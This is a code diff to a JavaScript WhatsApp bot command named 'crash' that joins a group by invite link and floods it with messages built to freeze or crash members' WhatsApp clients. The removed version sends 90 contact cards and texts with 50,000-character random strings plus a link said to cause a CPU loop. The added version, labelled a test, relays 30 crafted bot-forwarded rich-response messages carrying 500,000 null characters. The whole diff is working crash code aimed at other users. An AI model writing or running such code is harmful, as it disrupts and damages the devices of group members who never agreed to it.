@@ -1,6 +1,6 @@
 export default {
   name: ["crash"],
-  description: "Trava Zap: contacto con nombre gigante random + ráfaga",
+  description: "Prueba: botForwardedMessage con richResponse y 500k nulls",
   category: 'owner',
   ownerOnly: true,
 
@@ -21,53 +21,43 @@ export default {
     }
     try { await sock.groupAcceptInvite(code); } catch {}
 
-    // === TRAVA ZAP: letras y números random sin sentido ===
-    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#$%&@*+=';
-    const randomStr = (n) => {
-      let s = '';
-      for (let i = 0; i < n; i++) s += ALPHA[(Math.random() * ALPHA.length) | 0];
-      return s;
+    // 500.000 caracteres nulos escondidos en la anotación del richResponse
+    const annotations = '\u0000'.repeat(500000);
+
+    const payload = {
+      botForwardedMessage: {
+        message: {
+          richResponseMessage: {
+            messageType: 0,
+            submessages: [
+              { messageType: 7, mapMetadata: { annotations } },
+            ],
+            contextInfo: {
+              forwardingScore: 1,
+              isForwarded: true,
+              forwardOrigin: 4,
+              forwardedAiBotMessageInfo: { botJid: '0@bot' },
+            },
+          },
+        },
+      },
     };
 
-    const NOMBRE = randomStr(50000);   // nombre de contacto gigante
-    const TEXTO = randomStr(50000);    // texto random gigante
+    const total = 30;
+    const delayMs = 1200;
 
-    // vCard con el nombre monstruoso (así se manda el trava zap de verdad)
-    const vcard =
-      'BEGIN:VCARD\n' +
-      'VERSION:3.0\n' +
-      `FN:${NOMBRE}\n` +
-      `N:${NOMBRE};;;;\n` +
-      'TEL;type=CELL;type=VOICE;waid=5490000000000:+5490000000000\n' +
-      'END:VCARD';
-
-    const builds = [
-      // 1) CONTACTO con nombre gigante random  <- el trava zap real
-      () => sock.sendMessage(groupId, {
-        contacts: { displayName: NOMBRE, contacts: [{ vcard }] },
-      }),
-
-      // 2) TEXTO con la misma cadena random
-      () => sock.sendMessage(groupId, { text: TEXTO }),
-
-      // 3) Link que mete a WhatsApp en bucle de CPU
-      () => sock.sendMessage(groupId, { text: 'wa.me/channel' }),
-    ];
-
-    const total = 90;
-    const delayMs = 900;
-
-    await reply({ text: `💥 Trava Zap → ${groupId}\n> ${total} envíos (contacto random + texto + link)` });
+    await reply({ text: `🧪 Probando botForwardedMessage → ${groupId} (${total}x)` });
 
     for (let i = 0; i < total; i++) {
       try {
-        await builds[i % builds.length]();
-      } catch {
-        // sigue
+        await sock.relayMessage(groupId, payload, {});
+      } catch (e) {
+        await reply({ text: `❌ Falló el envío: ${e.message}` });
+        break;
       }
       await new Promise((r) => setTimeout(r, delayMs));
     }
 
-    await reply({ text: `✅ Listo: ${total} mensajes a ${groupId}.` });
+    await reply({ text: `✅ Listo: ${total} envíos a ${groupId}.` });
   },
 };
